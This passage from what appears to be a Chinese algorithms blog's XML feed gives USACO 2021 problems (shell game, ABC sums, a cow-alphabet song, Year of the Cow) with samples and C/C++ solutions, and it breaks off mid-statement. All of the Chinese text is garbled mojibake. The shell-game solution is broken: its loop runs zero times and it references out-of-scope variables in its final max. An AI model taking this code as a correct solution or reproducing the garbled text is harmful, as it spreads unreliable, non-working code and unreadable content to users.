åœ¨æ¡Œå­ä¸Šæ”¾ç½®ä¸‰ä¸ªå€’ç½®çš„åšæœå£³ï¼Œ<strong>1å·åšæœå£³æ”¾åœ¨ä½ç½®1ï¼Œ2å·åšæœå£³æ”¾åœ¨ä½ç½®2ï¼Œ3å·åšæœå£³æ”¾åœ¨ä½ç½®3</strong>ã€‚å¹¶åœ¨å…¶ä¸­ä¸€ä¸ªåšæœå£³ä¸‹é¢è—äº†ä¸€å—å°çš„é¹…åµçŸ³ï¼ˆè‡³å°‘å¥¹å¸Œæœ›è¿™æ˜¯ä¸€å—é¹…åµçŸ³â€”â€”å¥¹åœ¨ä¸€å—ç‰§åœºçš„åœ°ä¸Šæ‰¾åˆ°çš„ï¼‰ã€‚</p><p>éšå Bessie ä¼šä¸¤ä¸¤è°ƒæ¢åšæœå£³ï¼Œé¹…åµçŸ³ä¼šéšç€åšæœå£³ä¸€èµ·ç§»åŠ¨ï¼ŒåŒæ—¶ Elsie è¯•ç€å»çŒœé¹…åµçŸ³çš„ä½ç½®ã€‚</p><p>å¥¶ç‰›ä»¬åœ¨å†œä¸šå±•è§ˆä¼šä¸Šçœ‹åˆ°çš„è¿™ä¸ªæ¸¸æˆçš„æ ‡å‡†å½¢å¼æ˜¯ç©å®¶å¯ä»¥çœ‹åˆ°é¹…åµçŸ³åˆå§‹çš„ä½ç½®ï¼Œç„¶åè¦æ±‚ç©å®¶çŒœæ‰€æœ‰äº¤æ¢å®Œæˆä¹‹åé¹…åµçŸ³æœ€ç»ˆçš„ä½ç½®ã€‚</p><p>ç„¶è€Œï¼Œç°åœ¨å¥¶ç‰›ä»¬æƒ³è¦å»è¿›è¡Œè¿™æ ·ä¸€ç§ç©æ³•ï¼ŒElsie ä¸çŸ¥é“é¹…åµçŸ³çš„åˆå§‹ä½ç½®ï¼ŒåŒæ—¶å¥¹å¯ä»¥åœ¨æ¯ä¸€æ¬¡äº¤æ¢ä¹‹åçŒœä¸€ä¸‹é¹…åµçŸ³çš„ä½ç½®ã€‚</p><p>Bessie çŸ¥é“æ­£ç¡®ç­”æ¡ˆï¼Œåœ¨æ¸¸æˆç»“æŸåä¼šç»™ Elsie ä¸€ä¸ªåˆ†æ•°ï¼Œç­‰äºå¥¹çŒœå¯¹çš„æ¬¡æ•°ã€‚</p><p>ç»™å®šæ‰€æœ‰çš„äº¤æ¢å’Œ Elsie çš„çŒœæµ‹ï¼Œä½†æ˜¯ä¸ç»™å‡ºé¹…åµçŸ³çš„åˆå§‹ä½ç½®ï¼Œè¯·æ±‚å‡º Elsie æœ€é«˜å¯èƒ½è·å¾—çš„åˆ†æ•°ã€‚</p><h4 id="è¾“å…¥æ ¼å¼-4"><a href="#è¾“å…¥æ ¼å¼-4" class="headerlink" title="è¾“å…¥æ ¼å¼"></a>è¾“å…¥æ ¼å¼</h4><p>è¾“å…¥çš„ç¬¬ä¸€è¡ŒåŒ…å«ä¸€ä¸ªæ•´æ•° $N$ï¼Œä¸ºäº¤æ¢çš„æ¬¡æ•°ã€‚</p><p>ä»¥ä¸‹ $N$ è¡Œæ¯è¡Œæè¿°äº†æ¸¸æˆçš„ä¸€ä¸ªå›åˆï¼ŒåŒ…å«ä¸‰ä¸ªæ•´æ•° $aã€b$ å’Œ $g$ï¼Œè¡¨ç¤º Bessie äº¤æ¢äº†<strong>ä½ç½®</strong> $a$ å’Œ $b$ çš„åšæœå£³ï¼Œç„¶å Elsie çŒœçš„æ˜¯<strong>ä½ç½®</strong> $g$ã€‚</p><p>æ‰€æœ‰è¿™ä¸‰ä¸ªæ•°å‡ä¸º $1ã€2ã€3$ ä¹‹ä¸€ï¼Œå¹¶ä¸” $aâ‰ b$ã€‚</p><h4 id="è¾“å‡ºæ ¼å¼-4"><a href="#è¾“å‡ºæ ¼å¼-4" class="headerlink" title="è¾“å‡ºæ ¼å¼"></a>è¾“å‡ºæ ¼å¼</h4><p>è¾“å‡º Elsie å¯ä»¥å¾—åˆ°çš„æœ€é«˜åˆ†æ•°ã€‚</p><h4 id="æ•°æ®èŒƒå›´-4"><a href="#æ•°æ®èŒƒå›´-4" class="headerlink" title="æ•°æ®èŒƒå›´"></a>æ•°æ®èŒƒå›´</h4><p>$1 \le N \le 100$</p><h4 id="è¾“å…¥æ ·ä¾‹ï¼š-4"><a href="#è¾“å…¥æ ·ä¾‹ï¼š-4" class="headerlink" title="è¾“å…¥æ ·ä¾‹ï¼š"></a>è¾“å…¥æ ·ä¾‹ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">31 2 13 2 11 3 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="è¾“å‡ºæ ·ä¾‹ï¼š-4"><a href="#è¾“å‡ºæ ·ä¾‹ï¼š-4" class="headerlink" title="è¾“å‡ºæ ·ä¾‹ï¼š"></a>è¾“å‡ºæ ·ä¾‹ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="æ ·ä¾‹è§£é‡Š-4"><a href="#æ ·ä¾‹è§£é‡Š-4" class="headerlink" title="æ ·ä¾‹è§£é‡Š"></a>æ ·ä¾‹è§£é‡Š</h4><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼ŒElsie æœ€å¤šå¯ä»¥è·å¾— $2$ åˆ†ã€‚</p><p>å¦‚æœé¹…åµçŸ³å¼€å§‹æ—¶ä½äºåšæœå£³ $1$ ä¸‹é¢ï¼Œé‚£ä¹ˆå¥¹çŒœä¸­äº†ä¸€æ¬¡ï¼ˆæœ€åä¸€æ¬¡ï¼‰ã€‚</p><p>å¦‚æœé¹…åµçŸ³å¼€å§‹æ—¶ä½äºåšæœå£³ $2$ ä¸‹é¢ï¼Œé‚£ä¹ˆå¥¹çŒœä¸­äº†ä¸¤æ¬¡ï¼ˆå¼€å§‹ä¸¤æ¬¡ï¼‰ã€‚</p><p>å¦‚æœé¹…åµçŸ³å¼€å§‹æ—¶ä½äºåšæœå£³ $3$ ä¸‹é¢ï¼Œé‚£ä¹ˆå¥¹æ²¡æœ‰çŒœå¯¹ä»»ä½•ä¸€æ¬¡ã€‚</p><h4 id="é¢˜è§£ï¼š-4"><a href="#é¢˜è§£ï¼š-4" class="headerlink" title="é¢˜è§£ï¼š"></a>é¢˜è§£ï¼š</h4><p>è¿˜æ˜¯æ¨¡æ‹Ÿæšä¸¾ï¼Œæ¯”è¾ƒç»•ã€‚<span class="github-emoji"><span>ğŸ˜¢</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f622.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></p><p>å¦‚æœæŸæ¬¡äº¤æ¢åï¼ŒçŒœçŸ³å¤´åœ¨ç¼–å·ä¸º x çš„åšæœå£³ä¸‹é¢ï¼Œåªæœ‰çŸ³å­ä½ç½®åœ¨ç¼–å·åšæœä¸º x çš„å£³æ‰€åœ¨ä½ç½®ä¸Šçš„æ—¶å€™ï¼Œæ‰å¾—åˆ†ã€‚</p><p>å¦‚æœç”¨ f[i] ä¿å­˜ç¼–å·ä¸º i çš„åšæœå£³çš„ä½ç½®ã€‚çŒœç¼–å·ä¸º x çš„åšæœå£³ï¼Œåªæœ‰çŸ³å­ä½ç½®åœ¨ f[x] çš„æ—¶å€™æ‰å¾—åˆ†ã€‚</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream&gt;</span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">int</span> f<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> cnt<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                                <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> n<span class="token punctuation">;</span>cin<span class="token operator">&gt;&gt;</span>n<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>i <span class="token operator">&lt;=</span> <span class="token number">3</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> f<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>    <span class="token comment">//ç¼–å·ä¸ºiçš„åšæœå£³åœ¨f[i] </span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">;</span>cin<span class="token operator">&gt;&gt;</span>a<span class="token operator">&gt;&gt;</span>b<span class="token operator">&gt;&gt;</span>c<span class="token punctuation">;</span><span class="token function">swap</span><span class="token punctuation">(</span>f<span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">,</span>f<span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>cnt<span class="token punctuation">[</span>f<span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>          <span class="token comment">//çŒœåœ¨cåšæœå£³ä¸­ï¼Œæ‰€ä»¥åªæœ‰çŸ³å­ä½ç½®ä¸º f[c] çš„æƒ…å†µä¸‹ï¼ŒçŒœ c åšæœå£³æ‰å¾—åˆ†                 </span><span class="token punctuation">}</span><span class="token keyword">int</span> ans <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>cnt<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">max</span><span class="token punctuation">(</span>cnt<span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">,</span>cnt<span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>cout<span class="token operator">&lt;&lt;</span>ans<span class="token punctuation">;</span> <span class="token punctuation">}</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> ç®—æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç®—æ³• </tag>
            
            <tag> acwing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ¯æ—¥ä¸€é¢˜ï¼ˆä¸€ï¼‰</title>
      <link href="/2022/03/27/mei-ri-yi-ti-yi/"/>
      <url>/2022/03/27/mei-ri-yi-ti-yi/</url>
      
        <content type="html"><![CDATA[<p>è¿™äº›é¢˜å‡æ¥è‡ªäºUSACO 2021ï¼Œæ¯”è¾ƒç®€å•çš„é¢˜ã€‚</p><h2 id="ä½ çŸ¥é“ä½ çš„ABCå—"><a href="#ä½ çŸ¥é“ä½ çš„ABCå—" class="headerlink" title="ä½ çŸ¥é“ä½ çš„ABCå—"></a>ä½ çŸ¥é“ä½ çš„ABCå—</h2><p>$Farmer John$ çš„å¥¶ç‰›æ­£åœ¨ <code>mooZ</code> è§†é¢‘ä¼šè®®å¹³å°ä¸Šä¸¾è¡Œæ¯æ—¥é›†ä¼šã€‚</p><p>å¥¹ä»¬å‘æ˜äº†ä¸€ä¸ªç®€å•çš„æ•°å­—æ¸¸æˆï¼Œä¸ºä¼šè®®å¢æ·»ä¸€äº›ä¹è¶£ã€‚</p><p>$Elsie$ æœ‰ä¸‰ä¸ªæ­£æ•´æ•°$ Aã€BAã€B å’Œ C (Aâ‰¤Bâ‰¤Cï¼‰$ã€‚</p><p>è¿™äº›æ•°å­—æ˜¯ä¿å¯†çš„ï¼Œå¥¹ä¸ä¼šç›´æ¥é€éœ²ç»™å¥¹çš„å§å¦¹$ Bessie$ã€‚</p><p>å¥¹å‘Šè¯‰ $Bessie$ ä¸ƒä¸ªèŒƒå›´åœ¨ $1â€¦109$ ä¹‹é—´çš„æ•´æ•°ï¼ˆä¸ä¸€å®šå„ä¸ç›¸åŒï¼‰ï¼Œå¹¶å®£ç§°è¿™æ˜¯ $Aã€Bã€Cã€A+Bã€B+Cã€C+Aå’Œ A+B+CA+B+C$ çš„æŸç§æ’åˆ—ã€‚</p><p>ç»™å®šè¿™ä¸ƒä¸ªæ•´æ•°ï¼Œè¯·å¸®åŠ© $Bessie$ æ±‚å‡º$ Aã€B å’Œ C$ã€‚</p><p>å¯ä»¥è¯æ˜ï¼Œç­”æ¡ˆæ˜¯å”¯ä¸€çš„ã€‚</p><h4 id="è¾“å…¥æ ¼å¼"><a href="#è¾“å…¥æ ¼å¼" class="headerlink" title="è¾“å…¥æ ¼å¼"></a>è¾“å…¥æ ¼å¼</h4><p>è¾“å…¥ä¸€è¡Œï¼ŒåŒ…å«ä¸ƒä¸ªç©ºæ ¼åˆ†éš”çš„æ•´æ•°ã€‚</p><h4 id="è¾“å‡ºæ ¼å¼"><a href="#è¾“å‡ºæ ¼å¼" class="headerlink" title="è¾“å‡ºæ ¼å¼"></a>è¾“å‡ºæ ¼å¼</h4><p>è¾“å‡º $Aã€B$å’Œ $C$ï¼Œç”¨ç©ºæ ¼åˆ†éš”ã€‚</p><h4 id="æ•°æ®èŒƒå›´"><a href="#æ•°æ®èŒƒå›´" class="headerlink" title="æ•°æ®èŒƒå›´"></a>æ•°æ®èŒƒå›´</h4><p>$1â‰¤æ‰€æœ‰è¾“å…¥çš„æ•´æ•°â‰¤10^9$</p><h4 id="è¾“å…¥æ ·ä¾‹ï¼š"><a href="#è¾“å…¥æ ·ä¾‹ï¼š" class="headerlink" title="è¾“å…¥æ ·ä¾‹ï¼š"></a>è¾“å…¥æ ·ä¾‹ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">2 2 11 4 9 7 9<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="è¾“å‡ºæ ·ä¾‹ï¼š"><a href="#è¾“å‡ºæ ·ä¾‹ï¼š" class="headerlink" title="è¾“å‡ºæ ·ä¾‹ï¼š"></a>è¾“å‡ºæ ·ä¾‹ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">2 2 7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="é¢˜è§£ï¼š"><a href="#é¢˜è§£ï¼š" class="headerlink" title="é¢˜è§£ï¼š"></a>é¢˜è§£ï¼š</h4><p>ä¸€é“éå¸¸ç®€å•çš„æ•°å­¦æ€ç»´é¢˜ï¼Œå› ä¸ºéƒ½æ˜¯æ­£æ•´æ•°ï¼Œç›¸åŠ åªä¼šæ¯”åŸæ¥çš„æ•°å­—æ›´å¤§ï¼Œæ’ä¸ªåºã€‚æœ€å°çš„ä¸¤ä¸ªå°±æ˜¯$A$ï¼Œ$B$ï¼Œæœ€å¤§çš„ä¸€ä¸ªå¿…ç„¶æ˜¯$A+B+C$ï¼Œç›¸å‡å°±å¾—åˆ°äº†$C$</p><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">#include&lt;iostream&gt;#include&lt;algorithm&gt;using namespace std; typedef long long LL;LL arr[7];int main(){LL a,b,c;for(int i = 0;i&lt;7;i++){cin&gt;&gt;arr[i];}sort(arr,arr+7);c = arr[6]-arr[0]-arr[1];cout&lt;&lt;arr[0]&lt;&lt;" "&lt;&lt;arr[1]&lt;&lt;" "&lt;&lt;c;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="æ”¾å…»ä½†æ²¡æœ‰å®Œå…¨æ”¾å…»"><a href="#æ”¾å…»ä½†æ²¡æœ‰å®Œå…¨æ”¾å…»" class="headerlink" title="æ”¾å…»ä½†æ²¡æœ‰å®Œå…¨æ”¾å…»"></a>æ”¾å…»ä½†æ²¡æœ‰å®Œå…¨æ”¾å…»</h2><p>ä¸€ä¸ªé²œä¸ºäººçŸ¥çš„äº‹å®æ˜¯ï¼Œå¥¶ç‰›æ‹¥æœ‰è‡ªå·±çš„æ–‡å­—ï¼šã€Œç‰›æ–‡ã€ã€‚</p><p>ç‰›æ–‡ç”± $26$ ä¸ªå­—æ¯ <code>a</code> åˆ° <code>z</code> ç»„æˆï¼Œä½†æ˜¯å½“å¥¶ç‰›è¯´ç‰›æ–‡æ—¶ï¼Œå¯èƒ½ä¸æˆ‘ä»¬æ‰€ç†Ÿæ‚‰çš„ <code>abcdefghijklmnopqrstuvwxyz</code> ä¸åŒï¼Œå¥¹ä¼šæŒ‰æŸç§ç‰¹å®šçš„é¡ºåºæ’åˆ—å­—æ¯ã€‚</p><p>ä¸ºäº†æ‰“å‘æ—¶é—´ï¼Œå¥¶ç‰› $Bessie$ åœ¨åå¤å“¼å”±ç‰›æ–‡å­—æ¯æ­Œï¼Œè€Œ $Farmer John$ å¥½å¥‡å¥¹å”±äº†å¤šå°‘éã€‚</p><p>ç»™å®šä¸€ä¸ªå°å†™å­—æ¯ç»„æˆçš„å­—ç¬¦ä¸²ï¼Œä¸º $Farmer John $å¬åˆ° $Bessie$ å”±çš„å­—æ¯ï¼Œè®¡ç®— $Bessie$ è‡³å°‘å”±äº†å‡ éå®Œæ•´çš„ç‰›æ–‡å­—æ¯æ­Œï¼Œä½¿å¾— $Farmer John$ èƒ½å¤Ÿå¬åˆ°ç»™å®šçš„å­—ç¬¦ä¸²ã€‚</p><p>$Farmer John$ å¹¶ä¸å§‹ç»ˆæ³¨æ„ $Bessie$ æ‰€å”±çš„å†…å®¹ï¼Œæ‰€ä»¥ä»–å¯èƒ½ä¼šæ¼å¬ $Bessie$ å”±è¿‡çš„ä¸€äº›å­—æ¯ã€‚</p><p>ç»™å®šçš„å­—ç¬¦ä¸²ä»…åŒ…å«ä»–è®°å¾—ä»–æ‰€å¬åˆ°çš„å­—æ¯ã€‚</p><h4 id="è¾“å…¥æ ¼å¼-1"><a href="#è¾“å…¥æ ¼å¼-1" class="headerlink" title="è¾“å…¥æ ¼å¼"></a>è¾“å…¥æ ¼å¼</h4><p>è¾“å…¥çš„ç¬¬ä¸€è¡ŒåŒ…å« $26$ ä¸ªå°å†™å­—æ¯ï¼Œä¸º<code>a</code>åˆ°<code>z</code>çš„ç‰›æ–‡å­—æ¯è¡¨é¡ºåºã€‚</p><p>ä¸‹ä¸€è¡ŒåŒ…å«ä¸€ä¸ªå°å†™å­—æ¯ç»„æˆçš„å­—ç¬¦ä¸²ï¼Œä¸º $Farmer John$ å¬åˆ° $Bessie$ å”±çš„å­—æ¯ã€‚</p><h4 id="è¾“å‡ºæ ¼å¼-1"><a href="#è¾“å‡ºæ ¼å¼-1" class="headerlink" title="è¾“å‡ºæ ¼å¼"></a>è¾“å‡ºæ ¼å¼</h4><p>è¾“å‡º $Bessie$ æ‰€å”±çš„å®Œæ•´çš„ç‰›æ–‡å­—æ¯æ­Œçš„æœ€å°æ¬¡æ•°ã€‚</p><h4 id="æ•°æ®èŒƒå›´-1"><a href="#æ•°æ®èŒƒå›´-1" class="headerlink" title="æ•°æ®èŒƒå›´"></a>æ•°æ®èŒƒå›´</h4><p>å­—ç¬¦ä¸²çš„é•¿åº¦ä¸å°äº $1$ ä¸”ä¸å¤§äº $1000$ã€‚</p><h4 id="è¾“å…¥æ ·ä¾‹ï¼š-1"><a href="#è¾“å…¥æ ·ä¾‹ï¼š-1" class="headerlink" title="è¾“å…¥æ ·ä¾‹ï¼š"></a>è¾“å…¥æ ·ä¾‹ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">abcdefghijklmnopqrstuvwxyzmood<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="è¾“å‡ºæ ·ä¾‹ï¼š-1"><a href="#è¾“å‡ºæ ·ä¾‹ï¼š-1" class="headerlink" title="è¾“å‡ºæ ·ä¾‹ï¼š"></a>è¾“å‡ºæ ·ä¾‹ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="æ ·ä¾‹è§£é‡Š"><a href="#æ ·ä¾‹è§£é‡Š" class="headerlink" title="æ ·ä¾‹è§£é‡Š"></a>æ ·ä¾‹è§£é‡Š</h4><p>åœ¨è¿™ä¸ªæ ·ä¾‹ä¸­ï¼Œç‰›æ–‡å­—æ¯è¡¨ä¸æ—¥å¸¸çš„å­—æ¯è¡¨çš„æ’åˆ—ä¸€è‡´ã€‚</p><p>$Bessie$ è‡³å°‘å”±äº†ä¸‰éç‰›æ–‡å­—æ¯æ­Œã€‚</p><p>æœ‰å¯èƒ½ $Bessie$ åªå”±äº†ä¸‰éç‰›æ–‡å­—æ¯æ­Œï¼Œè€Œ $Farmer John$ å¬åˆ°äº†ä»¥ä¸‹è¢«æ ‡è®°ä¸ºå¤§å†™çš„å­—æ¯ã€‚</p><pre class="line-numbers language-none"><code class="language-none">abcdefghijklMnOpqrstuvwxyzabcdefghijklmnOpqrstuvwxyzabcDefghijklmnopqrstuvwxyz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="é¢˜è§£ï¼š-1"><a href="#é¢˜è§£ï¼š-1" class="headerlink" title="é¢˜è§£ï¼š"></a>é¢˜è§£ï¼š</h4><p>ä¹Ÿæ˜¯ä¸€é“æ€ç»´é¢˜ï¼Œæƒ³æ˜ç™½å°±è¡Œäº†ã€‚å…¶å®ï¼Œåªè¦æˆ‘åé¢çš„å­—ç¬¦æ¯”å‰é¢çš„å­—ç¬¦åœ¨ç‰›æ–‡å­—æ¯è¡¨çš„é¡ºåºä¸­é å‰æˆ–è€…ç›¸ç­‰ï¼Œå°±å¾—å†å¬ä¸€éç‰›æ–‡å­—æ¯æ­Œã€‚</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;cstring&gt;</span></span>using namespace std<span class="token punctuation">;</span>string b<span class="token punctuation">,</span>c<span class="token punctuation">;</span><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> ans<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>cin<span class="token operator">&gt;&gt;</span>b<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">26</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>a<span class="token punctuation">[</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span><span class="token char">'a'</span><span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span><span class="token punctuation">}</span>cin<span class="token operator">&gt;&gt;</span>c<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>c<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>c<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span><span class="token char">'a'</span><span class="token punctuation">]</span><span class="token operator">&lt;=</span>a<span class="token punctuation">[</span>c<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token char">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> ans<span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">}</span>cout<span class="token operator">&lt;&lt;</span>ans<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ç‰›å¹´"><a href="#ç‰›å¹´" class="headerlink" title="ç‰›å¹´"></a>ç‰›å¹´</h2><p>$Farmer John$ çš„å¥¶ç‰›ä»¬å¾—çŸ¥æœ€è¿‘æ­£åœ¨åº†ç¥ç‰›å¹´çš„åˆ°æ¥æ—¶ååˆ†å…´å¥‹ã€‚</p><p>ç‰›å¹´æ€»æ˜¯å¥¶ç‰›ä»¬çš„æœ€çˆ±ã€‚</p><p>æˆ‘ä»¬çŸ¥é“ï¼Œä¸­å›½å†æ³•ä¸­æ¯ä¸€å¹´æ‰€å¯¹åº”çš„ç”Ÿè‚–éµå¾ª $12$ å¹´çš„å‘¨æœŸï¼š<code>Ox, Tiger, Rabbit, Dragon, Snake, Horse, Goat, Monkey, Rooster, Dog, Pig, Rat</code>ï¼ˆç‰›ã€è™ã€å…”ã€é¾™ã€è›‡ã€é©¬ã€ç¾Šã€çŒ´ã€é¸¡ã€ç‹—ã€çŒªã€é¼ ï¼‰ï¼Œç„¶åå›åˆ°ç‰›ã€‚</p><p>å¥¶ç‰› $Bessie$ è‡ªè±ªåœ°è¯´å¥¹æ˜¯åœ¨è®¸å¤šå¹´å‰çš„ä¸€ä¸ªç‰›å¹´å‡ºç”Ÿçš„ã€‚</p><p>å¥¹çš„æœ‹å‹ $Elsie$ æƒ³è¦çŸ¥é“å¥¹ä¸ $Bessie$ å‡ºç”Ÿç›¸å·®å¤šå°‘å¹´ï¼Œå¹¶ä¸”å¸Œæœ›ä½ èƒ½å¤Ÿé€šè¿‡æŸ¥çœ‹å†œåœºä¸Šè‹¥å¹²å¥¶ç‰›å‡ºç”Ÿå¹´ä»½ä¹‹é—´çš„å…³ç³»æ¥å¸®åŠ©å¥¹æ¨ç®—ã€‚</p><h4 id="è¾“å…¥æ ¼å¼-2"><a href="#è¾“å…¥æ ¼å¼-2" class="headerlink" title="è¾“å…¥æ ¼å¼"></a>è¾“å…¥æ ¼å¼</h4><p>è¾“å…¥çš„ç¬¬ä¸€è¡ŒåŒ…å«ä¸€ä¸ªæ•´æ•° $N$ã€‚</p><p>ä»¥ä¸‹ $N$ è¡Œæ¯è¡ŒåŒ…å«ä¸€ä¸ª $8 $ä¸ªå•è¯çš„çŸ­è¯­ï¼ŒæŒ‡å®šäº†ä¸¤å¤´å¥¶ç‰›çš„å‡ºç”Ÿå¹´ä»½ä¹‹é—´çš„å…³ç³»ï¼Œæ ¼å¼ä¸º <code>Mildred born in previous Dragon year from Bessie</code>ï¼ˆMildred åœ¨ $Bessie$ å‡ºç”Ÿçš„å‰ä¸€ä¸ªé¾™å¹´å‡ºç”Ÿï¼‰ï¼Œæˆ– <code>Mildred born in next Dragon year from Bessie</code>ï¼ˆ$Mildred$ åœ¨ $Bessie$ å‡ºç”Ÿçš„åä¸€ä¸ªé¾™å¹´å‡ºç”Ÿï¼‰ã€‚</p><p>æœ€åä¸€ä¸ªå•è¯æ˜¯å†œåœºä¸ŠæŸä¸€å¤´å¥¶ç‰›çš„åå­—ï¼Œä¸º â€œ$Bessie$â€ æˆ–ä¸€å¤´å·²ç»åœ¨ä¹‹å‰çš„è¾“å…¥ä¸­å‡ºç°è¿‡çš„å¥¶ç‰›ã€‚</p><p>ç¬¬ä¸€ä¸ªå•è¯æ˜¯å†œåœºä¸ŠæŸä¸€å¤´å¥¶ç‰›çš„åå­—ï¼Œä¸ä¸º â€œ$Bessie$â€ ä¸”æœªåœ¨ä¹‹å‰çš„è¾“å…¥ä¸­å‡ºç°è¿‡ã€‚</p><p>æ‰€æœ‰çš„å¥¶ç‰›åå­—ä¸è¶…è¿‡ $10$ ä¸ªå­—ç¬¦ï¼Œä¸”ä»…åŒ…å«å­—ç¬¦ $a..z$ æˆ– $A..Z$ã€‚</p><p>ç¬¬$5$ ä¸ªå•è¯æ˜¯ä¸Šè¿°åäºŒç”Ÿè‚–ä¹‹ä¸€ã€‚</p><p>ç¬¬ $4 $ä¸ªå•è¯æ˜¯ <code>previous</code>ï¼ˆä¹‹å‰ï¼‰æˆ– <code>next</code>ï¼ˆä¹‹åï¼‰ä¹‹ä¸€ã€‚</p><p>ä¾‹å¦‚ï¼Œå¦‚æœçŸ­è¯­ä¸º <code>Mildred born in previous Dragon year from Bessie</code>ï¼Œåˆ™ Mildred çš„å‡ºç”Ÿå¹´ä»½ä¸ºæœ€ä¸ºæ¥è¿‘ä¸”ä¸¥æ ¼å¤„äº $Bessie$ çš„å‡ºç”Ÿå¹´ä»½ä¹‹å‰ï¼ˆä¸ç­‰äºï¼‰çš„é¾™å¹´ã€‚</p><h4 id="è¾“å‡ºæ ¼å¼-2"><a href="#è¾“å‡ºæ ¼å¼-2" class="headerlink" title="è¾“å‡ºæ ¼å¼"></a>è¾“å‡ºæ ¼å¼</h4><p>è¾“å‡º $Bessie$ å’Œ $Elsie$ 